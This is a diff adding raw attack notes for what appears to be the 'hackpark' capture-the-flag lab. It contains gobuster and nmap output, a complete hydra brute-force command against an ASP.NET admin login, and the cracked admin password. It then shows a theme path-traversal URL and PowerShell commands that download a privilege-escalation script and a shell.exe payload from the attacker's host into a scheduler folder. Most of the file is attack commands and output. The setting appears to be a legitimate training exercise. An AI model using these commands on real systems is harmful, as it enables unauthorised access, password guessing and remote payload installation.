@@ -1,0 +1,124 @@
+GOBUSTER.
+
+/search          
+│/default              (Status: 500) [Size: 1763]
+│/archives             (Status: 200) [Size: 8313]
+│/archive              (Status: 200) [Size: 8312]
+│/content              (Status: 301) [Size: 151] [--> http://10.10.96.124/content/]
+│/contactus            (Status: 200) [Size: 9924]
+│/Default              (Status: 500) [Size: 1763]
+│/contacts             (Status: 200) [Size: 9923]
+│/contact_us           (Status: 200) [Size: 9925]
+│/admin                (Status: 302) [Size: 172] [--> http://10.10.96.124/Account/login.aspx?ReturnURL=/admin]
+│/scripts              (Status: 301) [Size: 151] [--> http://10.10.96.124/scripts/]
+│/account              (Status: 301) [Size: 151] [--> http://10.10.96.124/account/]
+│/Search               (Status: 200) [Size: 8394]
+│/Contact              (Status: 200) [Size: 9922]
+│/contact-us           (Status: 200) [Size: 9925]
+│/ContactUs            (Status: 200) [Size: 9924]
+│/custom               (Status: 301) [Size: 150] [--> http://10.10.96.124/custom/]
+│/Content              (Status: 301) [Size: 151] [--> http://10.10.96.124/Content/]
+│/contactUs            (Status: 200) [Size: 9924]
+│/Blog                 (Status: 500) [Size: 1208]
+│/Archive              (Status: 200) [Size: 8312]
+│/contactinfo          (Status: 200) [Size: 9926]
+│/setup                (Status: 302) [Size: 174] [--> http://10.10.96.124/Account/login.aspx?ReturnUrl=%2fsetup]
+│/fonts                (Status: 301) [Size: 149] [--> http://10.10.96.124/fonts/]
+│/contact_off          (Status: 200) [Size: 9926]
+│/Contact_Us           (Status: 200) [Size: 9925]
+│/Contacts             (Status: 200) [Size: 9923]
+│/SearchResults        (Status: 200) [Size: 8401]
+│/%20                  (Status: 500) [Size: 1763]
+│/searchresults        (Status: 200) [Size: 8401]
+│/Archives             (Status: 200) [Size: 8313]
+│/search_form          (Status: 200) [Size: 8399]
+│/Scripts              (Status: 301) [Size: 151] [--> http://10.10.96.124/Scripts/]
+│/searchresultsbrief   (Status: 200) [Size: 8406]
+│/searchtips           (Status: 200) [Size: 8398]
+│/search2              (Status: 200) [Size: 8395]
+│/Account              (Status: 301) [Size: 151] [--> http://10.10.96.124/Account/]
+│/contact_form         (Status: 200) [Size: 9927]
+│/Fonts                (Status: 301) [Size: 149] [--> http://10.10.96.124/Fonts/]
+│/contact_information  (Status: 200) [Size: 9934]
+│/Admin                (Status: 302) [Size: 172] [--> http://10.10.96.124/Account/login.aspx?ReturnURL=/Admin]
+│/archive_query        (Status: 200) [Size: 8318]
+│/searching            (Status: 200) [Size: 8397]
+│/*checkout*           (Status: 500) [Size: 1763]
+│/search-engines       (Status: 200) [Size: 8402]
+│/contactform          (Status: 200) [Size: 9926]
+│/search_results       (Status: 200) [Size: 8402]
+│/search_left          (Status: 200) [Size: 8399]
+│/contacto             (Status: 200) [Size: 9923]
+│/searchengine         (Status: 200) [Size: 8400]
+│/search_tips          (Status: 200) [Size: 8399]
+│/contact_sales        (Status: 200) [Size: 9928]
+│/contact-info         (Status: 200) [Size: 9927]
+
+
+Nmap
+
+
+# Nmap 7.92 scan initiated Tue Sep 28 00:38:39 2021 as: nmap -sV -sC -oN hackpark.nmap 10.10.96.124
+Nmap scan report for 10.10.96.124 (10.10.96.124)
+Host is up (0.078s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 8.5
+| http-robots.txt: 6 disallowed entries 
+| /Account/*.* /search /search.aspx /error404.aspx 
+|_/archive /archive.aspx
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: hackpark | hackpark amusements
+|_http-server-header: Microsoft-IIS/8.5
+3389/tcp open  ssl/ms-wbt-server?
+|_ssl-date: 2021-09-27T21:40:44+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=hackpark
+| Not valid before: 2021-09-26T21:32:36
+|_Not valid after:  2022-03-28T21:32:36
+| rdp-ntlm-info: 
+|   Target_Name: HACKPARK
+|   NetBIOS_Domain_Name: HACKPARK
+|   NetBIOS_Computer_Name: HACKPARK
+|   DNS_Domain_Name: hackpark
+|   DNS_Computer_Name: hackpark
+|   Product_Version: 6.3.9600
+|_  System_Time: 2021-09-27T21:40:43+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Sep 28 00:40:44 2021 -- 1 IP address (1 host up) scanned in 125.88 seconds
+
+
+Hydra Command:
+
+
+
+hydra -l admin -P /Users/myyagis/Documents/wordlists/SecLists-master/Passwords/probable-v2-top12000.txt 10.10.96.124 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=4tc3eZW8RPWRBjUlNJ6N9lkeYvYk4zCsIXaoGuDaZZI8EEKSli2oMc8IG3gq95%2F%2BNtNUPPc7qhdHcaAcji9B%2F92gGHPcPBXujUOivQn7QeEKjhGDGtdBURGXKiBcfqdj5BP34Nj%2Boqn6c722du14yAZYgG7%2BfZHgVtiNSKawpsLG%2BhgA&__EVENTVALIDATION=0TMDOcGkQSopDwd1B8tFa4Z%2F3bi8GPPpJBPopFwGqIhgcMSUmlhGHRonF6ViLshJxk5wECJIz9bUitmrTTDNMguLMmdAyceVjg%2BCdMo9h%2BQSvSDFv0292xrTPl5ATdqLow%2FOu4YRK8CIZMADrxk42lE0GMpkqUVbH3xCyO4STd5J5Vtg&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" 
+
+
+Hydra output
+
+admin:1qaz2wsx
+
+
+admin post edit : http://{IP}/admin/app/editor/editpost.cshtml?id=f39c3289-e861-48f7-a4b7-edaaffe6f6dc
+
+Then visit : {IP}/?theme=../../App_Data/files
+
+
+
+powershell -c "Invoke-WebRequest -Uri 'http://10.8.235.86:8000/peas.bat' -OutFile 'C:\Windows\Temp\peas.bat'"
+
+
+
+powershell -c "Invoke-WebRequest -Uri 'http://10.8.235.86:8000/shell.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\shell.exe'"
+
+
+
+
+
+
+
+
+
